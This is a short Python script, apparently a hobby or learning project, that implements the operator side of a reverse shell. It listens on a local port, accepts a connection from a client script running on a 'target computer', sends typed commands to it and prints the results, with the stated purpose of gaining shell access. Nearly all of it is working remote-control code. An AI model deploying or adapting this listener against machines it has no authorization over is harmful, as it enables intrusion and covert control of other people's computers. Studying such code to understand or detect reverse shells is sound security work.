"""
Reverse shell server to receive communications from target.

This script is to be executed on the host to communicate with the 
client script on the target computer.  This is used to gain shell access 
on the target computer.

Author: Benjamin Garrard
Date: 6/25/2019

"""
import socket

address = ("localhost", 9999)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind(address)
    sock.listen(1)

    client, client_addr = sock.accept()

    print("Connection from: {}".format(client_addr))

    while True:
        init_res = client.recv(1024).decode()
        if "target:" in init_res:
            directory = init_res.split()[1]

        command = input("({}){}> ".format(client_addr[0], directory))
        if "terminate" in command:
            client.send(command.encode())
            client.close()
            break
        else:
            client.send(command.encode())
            response = client.recv(1024).decode()
            if "yolo" not in response:
                print(response)